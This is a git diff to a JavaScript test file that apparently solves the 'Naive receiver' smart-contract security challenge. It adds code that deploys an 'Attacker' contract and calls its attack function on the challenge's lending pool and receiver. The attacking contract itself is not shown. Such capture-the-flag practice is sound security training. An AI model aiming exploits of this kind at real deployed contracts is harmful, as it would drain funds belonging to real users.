@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require('ethers');
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
@@ -31,6 +32,11 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const AttackerFactory = await ethers.getContractFactory('Attacker', deployer);
+
+        let attacker = await AttackerFactory.deploy();
+
+        await attacker.attack(this.pool.address, this.receiver.address, BigNumber.from(0));
     });
 
     after(async function () {
